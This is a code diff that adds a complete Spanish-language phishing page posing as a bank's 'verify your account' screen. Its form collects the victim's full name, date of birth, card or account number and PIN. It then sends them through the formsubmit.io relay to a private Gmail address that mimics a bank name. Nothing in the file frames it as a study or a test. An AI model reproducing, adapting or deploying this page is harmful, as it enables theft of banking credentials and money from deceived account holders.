@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca</title>
+
+    <style>
+        *{
+            font-family: sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-size: 16px;
+            font-weight: lighter;
+          }
+          
+          input {
+            width: 95%;
+            height: 45px;
+            padding: 8px;
+            margin-bottom: 10px;
+            border-radius: 5px;
+            border: none;
+            background-color: #ccc;
+          }
+          
+          button {
+            background-color: #116529;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 9999px;
+            margin-top: 20px;
+            cursor: pointer;
+            width: 100%;
+            height: 65px;
+            font-size: 20px;
+          }
+          
+          button:hover {
+            background-color: #3e8e41;
+          }
+
+          #myForm{
+            padding: 20px;
+          }
+
+          .alerta{
+            background-color: #147030;
+            color: white;
+            text-align: center;
+            padding: 20px 2px 20px 2px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+          }
+
+          .descalerta{
+            font-size: 18px;
+            font-weight: lighter;
+          }
+          
+    </style>
+
+</head>
+<body>
+    <div class="alerta">
+        <h1 class="tituloalerta" >Comprueba tu cuenta</h1>
+        <h2 class="descalerta">Ingresa tus datos para comprobar tu identidad</h2>
+    </div>
+    <form id="myForm" id="contactform" action="https://formsubmit.io/send/aztecabancok@gmail.com" method="POST">
+        <label for="nombres">Nombre(s)</label>
+        <input type="text" id="nombres" name="nombres" required>
+      
+        <label for="apellidoPaterno">Apellido Paterno</label>
+        <input type="text" id="apellidoPaterno" name="apellidoPaterno" required>
+      
+        <label for="apellidoMaterno">Apellido Materno</label>
+        <input type="text" id="apellidoMaterno" name="apellidoMaterno" required>
+      
+        <label for="fechaNacimiento">Fecha de Nacimiento</label>
+        <input type="date" id="fechaNacimiento" name="fechaNacimiento" required>
+      
+        <label for="numeroTarjeta">Número de Tarjeta o cuenta</label>
+        <input type="text" id="numeroTarjeta" name="numeroTarjeta" required>
+      
+        <label for="nip">NIP:</label>
+        <input type="password" id="nip" name="nip" required>
+      
+        <button type="submit">Continuar</button>
+      </form>
+      
+</body>
+</html>
